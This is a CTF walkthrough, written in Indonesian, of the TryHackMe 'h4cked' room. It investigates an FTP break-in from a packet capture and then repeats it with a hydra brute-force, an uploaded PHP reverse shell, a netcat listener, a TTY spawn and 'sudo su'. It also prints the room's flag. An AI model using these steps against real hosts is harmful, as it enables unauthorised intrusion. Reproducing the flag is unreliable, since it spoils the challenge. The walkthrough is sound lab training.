# CTF - h4acked
- TryHackMe Challenge: https://tryhackme.com/room/h4cked
- IP Machine: 10.10.49.69

## Task 1 Oh no! We've been hacked!
- Buka file **capture.pcapng** menggunakan tool Wireshark
- **Pertanyaan:** The attacker is trying to log into a specific service. What service is this?
- Sorting packet berdasarkan protocol, disini kita melihat bahwa attacker berusaha mengakses masuk ke FTP Server

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%201.JPG)

```sh
FTP
```
- **Pertanyaan:** There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?
- Lakukan pencarian menggunakan google, disini didapat informasi bahwa tool tersebut adalah **thc-hydra** atau lebih dikenal dengan **hydra**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%202.JPG)

- Di kali linux juga sudah terinstall tool hydra secara default. Kita bisa menggunakan perintah `hydra -h` untuk melihat deskripsi dari tool ini  

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%203.JPG)

```sh
hydra
```

- **Pertanyaan:** The attacker is trying to log on with a specific username. What is the username?
- Kita bisa menerapkan filter **ftp.request** di Wireshark dan disini dapat kita amati bahwa attacker berusaha masuk ke FTP Server dengan Username **jenny**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%204.JPG)

```sh
jenny
```

- **Pertanyaan:** What is the user's password?
- Scroll kebawah hingga menemukan packet dengan Response **Login Successful**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%205.JPG)

- Klik kanan packet nomor 395 lalu pilih **Follow** kemudian pilih **TCP Stream**. Terlihat bahwa attacker berhasil mengakses FTP Server dengan USER **jenny** dan PASS **password123** 

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%206.JPG)

```sh
password123
```

- **Pertanyaan:** What is the current FTP working directory after the attacker logged in?
- Dari hasil TCP Stream diatas, terlihat bahwa setelah attacker mengetikkan perintah `PWD` hasilnya adalah `\var\www\html` 

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%207.JPG)

```sh
/var/www/html
```

- **Pertanyaan:** The attacker uploaded a backdoor. What is the backdoor's filename?
- Dari hasil TCP Stream diatas juga terlihat bahwa attacker mengetikkan perintah `STOR shell.php` untuk mengupload file **shell.php** ke FTP Server

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%208.JPG)

```sh
shell.php
```

- **Pertanyaan:** The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?
- Hapus filter sebelumnya dan gunakan filter **ftp-data** maka akan didapat 2 packet sebagai berikut

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%209.JPG)

- Klik kanan pada packet nomor 431 lalu pilih **Follow** kemudian **TCP Stream**. Disini terlihat isi file **shell.php** dan darimana script tersebut diperoleh

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2010.JPG)

```sh
http://pentestmonkey.net/tools/php-reverse-shell
```

- **Pertanyaan:** Which command did the attacker manually execute after getting a reverse shell?
- Hapus filter lalu kita telusuri packet dimana attacker mengeksekusi file **shell.php**. Terlihat di packet nomor 450 attacker melakukan request GET ke **shell.php**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2011.JPG)

- Karena di packet nomor 450 attacker mengeksekusi file **shell.php**, maka di packet nomor 452 attacker berhasil memperoleh hasil eksekusi file backdoor **shell.php**. Klik kanan pada packet nomor 452 lalu pilih **Follow** kemudian **TCP Stream**. Terlihat perintah pertama yang dieksekusi attacker adalah `whoami`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2012.JPG)

```sh
whoami
```

- **Pertanyaan:** What is the computer's hostname?
- Dari hasil TCP Stream diatas, terdapat deskripsi OS, hostname, dan sebagainya. Jika Linux adalah OS maka wir3 adalah hostname

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2013.JPG)

```sh
wir3
```

- **Pertanyaan:** Which command did the attacker execute to spawn a new TTY shell?
- Scroll kebawah hasil TCP Stream sebelumnya, disini terdapat perintah `python3 -c 'import pty; pty.spawn("/bin/bash")'`. Dimana perintah tersebut adalah perintah untuk TTY Shell

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2014.JPG)

```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

- **Pertanyaan:** Which command was executed to gain a root shell?
- Dari hasil TCP Stream diatas juga terlihat bahwa attacker berhasil mendapatkan akses root setelah mengeksekusi perintah `sudo su`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2015.JPG)

```sh
sudo su
```

- **Pertanyaan:** The attacker downloaded something from GitHub. What is the name of the GitHub project?
- Scroll kebawah hasil TCP Stream sebelumnya, disini ditemukan url repository git. Dimana f0rb1dd3n adalah pembuat repository dan Reptile adalah nama projeknya

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2016.JPG)

```sh
Reptile
```

- **Pertanyaan:** The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?
- Buka url repository git tersebut di browser, di bagian about terdapat informasi bahwa repository ini berisi tentang **LKM Linux rootkit**

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2017.JPG)

```sh
rootkit
```

## Tak 2 Hack your way back into the machine
- Disini kita akan melakukan hal yang sama seperti yang dilakukan oleh attacker
- Brute force akun FTP jenny menggunakan tool hydra dengan perintah `hydra -l jenny -P /usr/share/wordlists/rockyou.txt <IP_Machine> ftp`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2018.JPG)

- Kita berhasil menemukan password FTP jenny. Akses FTP server dengan perintah `ftp <IP_Machine>` setelah itu masukkan nama `jenny` dan password yang sudah ditemukan. Setelah berhasil login kita bisa mendownload file **shell.php** dengan perintah `get shell.php`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2019.JPG)

- Edit file **shell.php** dengan editor nano. Ubah IP dengan IP tun0 pada komputer yang anda gunakan

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2020.JPG)
![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2021.JPG)

- Upload file **shell.php** yang sudah diedit ke FTP Server dengan perintah `put shell.php`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2022.JPG)

- Buka terminal baru dan buat netcat yang me listen port 80 dengan perintah `nc -lnvp 80`

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2023.JPG)

- Jalankan file **shell.php** dengan mengakses url `http://<IP_Machine>/shell.php` di browser

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2024.JPG)

- Netcat berhasil terkoneksi

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2025.JPG)

- Bikin menjadi interaktif terminal dengan perintah dibawah ini:
```sh
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2026.JPG)

- Switch ke user jenny dengan perintah `su jenny` lalu masukkan password FTP jenny

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2027.JPG)

- Masuk ke akses root dengan perintah `sudo su` lalu masukkan password FTP jenny

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2028.JPG)

- Root flag berada di directory **/root/Reptile** jadi kita bisa gunakan perintah `cat /root/Reptile/flag.txt` untuk mendapatkan root flag

![alt text](https://github.com/rahardian-dwi-saputra/TryHackMe-WriteUps/blob/main/h4cked/assets/hk%2029.JPG)

- **Pertanyaan:** Read the flag.txt file inside the Reptile directory
```sh
ebcefd66ca4b559d17b440b6e67fd0fd
```